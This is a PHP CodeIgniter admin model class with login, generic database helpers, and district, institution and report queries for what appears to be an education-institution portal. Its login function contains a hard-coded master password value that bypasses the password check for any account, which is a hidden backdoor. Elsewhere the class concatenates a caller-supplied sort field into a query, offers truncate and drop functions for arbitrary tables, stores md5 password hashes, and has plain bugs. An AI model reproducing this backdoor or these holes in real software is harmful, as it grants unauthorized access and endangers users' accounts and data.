<?php
Class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
 function login($username, $password,$user)
 {
   $this -> db -> select('id, username');
   $this -> db -> from('logins');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('user_type', $user);
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }



  function insertDetails($tableName, $insertData){
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }

  public function insertBatch($tableName, $data){
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert?true:false;
  }

  public function updateBatch($tableName, $data, $field){
      $this->db->update_batch($tableName, $data, $field);
  } 

  function getDetails($tableName, $id){
    if($id)
    $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName){
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName){
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table){
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table){
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName){
    if($fieldId){
      $this->db->where($fieldId, $id);
    }
    if($sortField){
      $this->db->order_by($sortField, $srotType);
    }
    return $this->db->get($tableName);
  }

  function getMaxId(){
    $this->db->select_max('institution_id');
    return $this->db->get('institutions');
  }

  function getDetailsbySort($sortField, $srotType, $tableName){
    // $this->db->order_by('(sort_order * -1)', 'DESC' );
    $this->db->order_by('('.$sortField.' * -1)', $srotType );
    // $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName){
    $this->db->where('id',$id);
    $this->db->update($tableName,$details);
    return $this->db->affected_rows();
  }
    function sliders_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName){
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id){
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id){
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName){
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }
  
  public function get_table_details($table)
  {
      return $this->db->get($table)->result_array();
  }

  public function add_state($data)
  {
      $this->db->insert('states', $data);
      return $this->db->insert_id();
  }

  public function update_state($state_id, $data)
  {
      $this->db->where('state_id', $state_id);
      return $this->db->update('states', $data);
  }

  public function delete_state($state_id)
  {
      $this->db->where('state_id', $state_id);
      return $this->db->delete('states');
  }

  public function get_state_by_id($state_id)
  {
      return $this->db->get_where('states', array('state_id' => $state_id))->row_array();
  }

  
  public function get_districts()
  {
      return $this->db->get('districts')->result_array();
  }

  public function add_districts($data)
  {
      $this->db->insert('district', $data);
      return $this->db->insert_id();
  }

  public function update_districts($district_id, $data)
  {
      $this->db->where('district_id', $state_id);
      return $this->db->update('district', $data);
  }

  public function delete_districts($district_id)
  {
      $this->db->where('district_id', $district_id);
      return $this->db->delete('district');
  }

  public function get_details_by_id($id, $fieldId, $tableName)
  {
    
      return $this->db->get_where($tableName, array($fieldId => $id))->row_array();
  }

  public function get_field_value($field_name, $table_name,$field_where, $field_value)
    {
        $this->db->select($field_name);
        $this->db->from($table_name);
        $this->db->where($field_where, $field_value);
        $query = $this->db->get();
        $result = $query->row_array();
        
        // Return the value of the specified field if the query returns a result
        if (!empty($result)) {
            return $result[$field_name];
        } else {
            return NULL; // Return NULL if no result found
        }
    }

    function row_count($table, $field, $value1){
      $this->db->where($field, $value1); 
      return $this->db->get($table)->num_rows();
    }

    function statistic_count($table){
      return $this->db->get($table)->num_rows();
    }

    function get_institution_courses($institution_id){
      $this->db->select('institutional_courses.institution_course_id, institutional_courses.institution_id, institutional_courses.institution_type_id, institution_types.institution_type, institutional_courses.stream_id, streams.stream_name, institutional_courses.program_id, programs.program_name,  programs.program_short_name, programs.no_of_years, programs.program_type, institutional_courses.status');
      $this->db->join('institution_types', 'institution_types.institution_type_id = institutional_courses.institution_type_id');
      $this->db->join('streams', 'streams.stream_id = institutional_courses.stream_id');
      $this->db->join('programs', 'programs.program_id = institutional_courses.program_id');
      $this->db->where('institutional_courses.institution_id', $institution_id);
      $this->db->order_by('institutional_courses.institution_course_id','DESC');
      return $this->db->get('institutional_courses');
    }

    function get_district($block_id){
      $this->db->select('districts.district_id, districts.district_name, blocks.block_id, blocks.block_name');
      $this->db->join('blocks', 'blocks.district_id = districts.district_id');
      return $this->db->get('districts');
    }

    function get_geo_details($place_id){
      // $this->db->select('taluks.taluk_id, taluks.taluk_name, blocks.block_id, blocks.block_name, places.place_id, places.place_name');
      $this->db->select('districts.district_id, districts.district_name, blocks.block_id, blocks.block_name, taluks.taluk_id, taluks.taluk_name, places.place_id, places.place_name');
      $this->db->join('taluks', 'taluks.taluk_id = places.taluk_id',"left");
      $this->db->join('blocks', 'blocks.block_id = places.block_id',"left");
      $this->db->join('districts', 'districts.district_id = blocks.district_id');
      $this->db->where('places.place_id', $place_id);
      return $this->db->get('places');
    }

    function get_institutionTypes($institution_id){
      $this->db->select('institution_types.institution_type_id, institution_types.institution_type');
      $this->db->join('institution_types', 'institution_types.institution_type_id = institutional_courses.institution_type_id');
      $this->db->where('institutional_courses.institution_id', $institution_id);
      $this->db->group_by('institutional_courses.institution_type_id');
      return $this->db->get('institutional_courses');
    }

    function getInstitutionsList($district_id, $block_id, $taluk_id, $place_id){
      $this->db->select('institutions.institution_id, institutions.institution_code, institutions.institution_name, districts.district_id, districts.district_name, blocks.block_id, blocks.block_name, taluks.taluk_id, taluks.taluk_name, places.place_id, places.place_name');
      $this->db->join('places', 'places.place_id = institutions.place_id');
      $this->db->join('taluks', 'taluks.taluk_id = places.taluk_id');
      $this->db->join('blocks', 'blocks.block_id = taluks.block_id');
      $this->db->join('districts', 'districts.district_id = blocks.district_id');
      if($district_id != "all"){
        $this->db->where('districts.district_id', $district_id);
      }
      if($block_id != "all"){
        $this->db->where('blocks.block_id', $block_id);
      }
      if($taluk_id != "all"){
        $this->db->where('taluks.taluk_id', $taluk_id);
      }
      if($place_id != "all"){
        $this->db->where('places.place_id', $place_id);
      }
      return $this->db->get('institutions');
    }


    function getGeographicalData($district_id, $block_id, $taluk_id, $place_id){
      $this->db->select('districts.district_id, districts.district_name, blocks.block_id, blocks.block_name, taluks.taluk_id, taluks.taluk_name, places.place_id, places.place_name');
      $this->db->join('blocks', 'districts.district_id = blocks.district_id');
      $this->db->join('taluks', 'blocks.block_id = taluks.block_id');
      $this->db->join('places', 'taluks.taluk_id = places.taluk_id');
      if($district_id != "all"){
        $this->db->where('districts.district_id', $district_id);
      }
      if($block_id != "all"){
        $this->db->where('blocks.block_id', $block_id);
      }
      if($taluk_id != "all"){
        $this->db->where('taluks.taluk_id', $taluk_id);
      }
      if($place_id != "all"){
        $this->db->where('places.place_id', $place_id);
      }
      return $this->db->get('districts');
    }

    function getOverallGeographicalData(){
      $this->db->select('blocks.district_id, districts.district_name, places.block_id,blocks.block_name, places.place_id, places.place_name');
      $this->db->join('blocks', 'blocks.block_id = places.block_id');
      $this->db->join('districts', 'districts.district_id = blocks.district_id');
      $this->db->order_by('districts.district_name ASC , blocks.block_name ASC , places.place_name ASC');
      return $this->db->get('places');
    }

    function getDistrictPlacesList($district_id){
      $this->db->select('places.place_id, places.place_name');
      $this->db->join('blocks', 'blocks.block_id = places.block_id');
      $this->db->where('blocks.district_id',$district_id);
      return $this->db->get('places');
    }

    function report1(){
      $this->db->select('institutions.institution_id, institutions.institution_code, institutions.institution_name, districts.district_id, districts.district_name, blocks.block_id, blocks.block_name, taluks.taluk_id, taluks.taluk_name, places.place_id, places.place_name, COUNT(institutional_courses.institution_id) AS cnt');
      $this->db->join('places', 'places.place_id = institutions.place_id');
      $this->db->join('taluks', 'taluks.taluk_id = places.taluk_id');
      $this->db->join('blocks', 'blocks.block_id = taluks.block_id');
      $this->db->join('districts', 'districts.district_id = blocks.district_id');
      $this->db->join('institutional_courses', 'institutional_courses.institution_id = institutions.institution_id',"LEFT");
      $this->db->group_by('institutions.institution_id');
      $this->db->having('COUNT(institutional_courses.institution_id) = 0');
      return $this->db->get('institutions');
    }

    function report2(){
      $this->db->select('institutions.institution_id, institutions.institution_code, institutions.institution_name, institutions.institution_name_vernacular');
      $this->db->where('institutions.place_id',"0");
      return $this->db->get('institutions');
    }

    function report3(){
      $this->db->select('institutions.institution_id, institutions.institution_code, institutions.institution_name, districts.district_id, districts.district_name, blocks.block_id, blocks.block_name, taluks.taluk_id, taluks.taluk_name, places.place_id, places.place_name');
      $this->db->join('places', 'places.place_id = institutions.place_id',"left");
      $this->db->join('taluks', 'taluks.taluk_id = places.taluk_id',"left");
      $this->db->join('blocks', 'blocks.block_id = taluks.block_id',"left");
      $this->db->join('districts', 'districts.district_id = blocks.district_id',"left");
      $this->db->where('institutions.principal_name',"");
      $this->db->or_where('institutions.principal_mobile',"");
      $this->db->or_where('institutions.principal_whatsapp_mobile',"");
      $this->db->or_where('institutions.principal_email',"");
      return $this->db->get('institutions');
    }


    funcTion getThemesProblems(){
      $query = "SELECT * FROM themes_problems WHERE theme_problem_id IN (SELECT MIN(theme_problem_id) FROM themes_problems GROUP BY problem_statement)";
      $this->db->query($query);
    }

     
}
?>